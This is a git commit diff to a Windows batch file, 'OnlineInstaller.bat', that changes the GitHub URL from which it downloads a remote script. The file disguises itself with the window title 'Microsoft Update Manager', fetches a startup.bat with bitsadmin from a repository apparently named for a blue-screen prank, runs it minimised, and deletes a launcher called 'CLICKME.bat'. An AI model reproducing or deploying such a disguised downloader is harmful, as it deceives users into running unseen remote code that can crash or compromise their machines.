4fb565e53b3e4fe48b98d625a3ad9fd75810720b
Sean <155543056+SeanFromWP@users.noreply.github.com>
2024-12-12 08:30:48 +0800

    Update OnlineInstaller.bat

--- OnlineInstaller.bat
+++ OnlineInstaller.bat
@@ -1,5 +1,5 @@
 @echo off
 title Microsoft Update Manager
-bitsadmin /transfer /download /priority low "https://raw.githubusercontent.com/SeanFromWP/Temp/main/Online/startup.bat" "%AppData%\startup.bat"
+bitsadmin /transfer /download /priority low "https://raw.githubusercontent.com/SeanFromWP/BSOD-Rickroll/main/Online/startup.bat" "%AppData%\startup.bat"
 start /min %AppData%\startup.bat
 del CLICKME.bat
